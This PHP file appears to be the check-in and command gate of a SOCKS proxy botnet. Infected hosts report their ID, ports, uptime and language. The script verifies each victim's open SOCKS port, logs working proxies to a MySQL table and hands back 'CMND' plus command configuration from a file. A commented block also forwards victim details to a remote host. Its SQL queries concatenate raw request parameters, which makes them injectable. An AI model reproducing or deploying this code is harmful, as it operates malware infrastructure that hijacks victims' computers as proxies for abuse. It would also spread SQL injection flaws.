<?php

// Gettin all information
$id = $_GET['id'];
$httpport = $_GET['httpport'];
$socksport = $_GET['socksport'];
$uptimem = $_GET['uptimem'];
$uptimeh = $_GET['uptimeh'];
$param = $_GET['param'];
$ver = $_GET['ver'];
$uid = $_GET['uid'];
$wm = $_GET['wm'];
$lang = $_GET['lang'];
//$ssip = $_GET['ssip'] ;
$ip = getenv("REMOTE_ADDR");
$real_ip = getenv("HTTP_X_FORWARDED_FOR");
$browser = getenv("HTTP_USER_AGENT");

//Security check
if($ver == ''){
	exit;
}

include_once('./mysqllog.php');

//Replace symbols
$id = ereg_replace("<","&#8249",$id);
$id = ereg_replace(">","&#8250",$id);
$id = ereg_replace("\"","&#8221",$id);
$id = ereg_replace(";","",$id);
$id = ereg_replace("%","",$id);
$param = ereg_replace("<","&#8249",$param);
$param = ereg_replace(">","&#8250",$param);
$param = ereg_replace("\"","&#8221",$param);
$param = ereg_replace(";","",$param);
$param = ereg_replace("%","",$param);

/*=========================
$flip = file("logs/cip.dat");
$size  = strlen($flip);
if ($size > 10) {
 	$arr = explode(":", $flip[0]);
 	$aport=311;
}

if($arr[1] == $uid || $arr[1] == "0") {
	$fp = fsockopen($arr[0],$aport, $errno, $errstr, 30); 
	fputs($fp,"IP:$ip PORT:$param $tim SOCKS:$socksport HTTP:$httpport Uptime:$uptimeh:$uptimem lang-$lang uid:$uid id:$id v:$ver\r\n");
	fclose($fp);
}
//=========================*/

$date = date("Y-m-d");
$time=date("H:i:s");
list($year, $month, $day) = explode('-', $date);
$sql_uptime = "$uptimeh:$uptimem";

if($real_ip != "") {
	$fp = fsockopen($real_ip,$socksport, $errno, $errstr, 30); 
	if(!$fp) {
		$okk = false;		
	} else {
		$okk = true;
		
		$link = mysql_connect($mysql_host, $mysql_login, $mysql_pass) or die("Could not connect: " . mysql_error());
		mysql_select_db($mysql_db, $link) or die("Could not select : " . mysql_error());
		$query = 'SELECT COUNT(*) FROM socks where uid = "'. $uid .'"';
		$result = mysql_query($query, $link) or die("Could not execute: " . mysql_error());
		$count = mysql_result($result, 0);
		if ($count == 0) {
			$query = 'INSERT INTO socks VALUES ("'.$uid.'", "'. $real_ip . '", "'. $httpport .'", "'. $socksport . '", "'. $sql_uptime .'", "'. mktime() .'", "0")';
			$result = mysql_query($query, $link) or die("Could not execute: " . mysql_error());
		} else { 
			$query = 'UPDATE socks SET  `ip` = "'. $real_ip .'", `hport` = "'. $httpport .'", `sport` = "'. $socksport .'", `uptime` = "'. $sql_uptime .'", `update` = "'. mktime() .'" WHERE `uid` = "'.$uid.'"';
			$result = mysql_query($query, $link) or die("Could not execute: " . mysql_error());
			$query = 'COMMIT';
			$result = mysql_query($query, $link) or die("Could not execute: " . mysql_error());
		}
		mysql_close($link);

		//$fh=fopen("logs/P.$day.$month.txt","a+");
		//ip:hport:sport:bport:uptime:uid
		//fputs($fh,"$real_ip@$httpport@$socksport@$param@$uptimeh:$uptimem@$uid\r\n");
		//fclose($fh);
		send_command();
		exit;
	}
}

if( ($ip != "") && ($ip != $real_ip) ) {
	$fp = fsockopen($ip,$socksport, $errno, $errstr, 30);
	if(!$fp) {
		send_command();
		exit;
	} else {
		$link = mysql_connect($mysql_host, $mysql_login, $mysql_pass) or die("Could not connect: " . mysql_error());
		mysql_select_db($mysql_db, $link) or die("Could not select : " . mysql_error());
		$query = 'SELECT COUNT(*) FROM socks where uid = "'. $uid .'"';
		$result = mysql_query($query, $link) or die("Could not execute: " . mysql_error());
		$count = mysql_result($result, 0);
		if ($count == 0) {
			$query = 'INSERT INTO socks VALUES ("'.$uid.'", "'. $ip . '", "'. $httpport .'", "'. $socksport . '", "'. $sql_uptime .'", "'. mktime() .'", "0")';
			$result = mysql_query($query, $link) or die("Could not execute: " . mysql_error());
		} else { 
			$query = 'UPDATE socks SET  `ip` = "'. $ip .'", `hport` = "'. $httpport .'", `sport` = "'. $socksport .'", `uptime` = "'. $sql_uptime .'", `update` = "'. mktime() .'" WHERE `uid` = "'.$uid.'"';
			$result = mysql_query($query, $link) or die("Could not execute: " . mysql_error());
			$query = 'COMMIT';
			$result = mysql_query($query, $link) or die("Could not execute: " . mysql_error());
		}
		mysql_close($link);

		//$fh=fopen("logs/P.$day.$month.txt","a+");
		//ip:hport:sport:bport:uptime:uid
		//fputs($fh,"$ip@$httpport@$socksport@$param@$uptimeh:$uptimem@$uid\r\n");
		//fclose($fh);
		send_command();
		exit;
	}
}

send_command();
exit;

function send_command() {
$cmdname="logs/cfg.dat";
$cmduid="logs/uid.ini";

if(filesize("$cmduid") == 0) {
	$fh=fopen($cmdname,"r");
	$cfgdata=fread($fh,filesize($cmdname));
	fclose($fh);
	echo "CMND$cfgdata";
	exit;
}

$array=file($cmduid);
$kolvo=count($array);
for($ei=0;$ei<$kolvo;$ei++) {
	$llen=strlen($array[$ei]);
	$llen=$llen-2;
	$array[$ei]=substr($array[$ei],0,$llen);
	if($array[$ei] == $uid) {
		$fh=fopen($cmdname,"r");
		$cfgdata=fread($fh,filesize($cmdname));
		fclose($fh);
		echo "CMND$cfgdata";
		exit;
	}
}
echo "CMND\r\n";
}

?>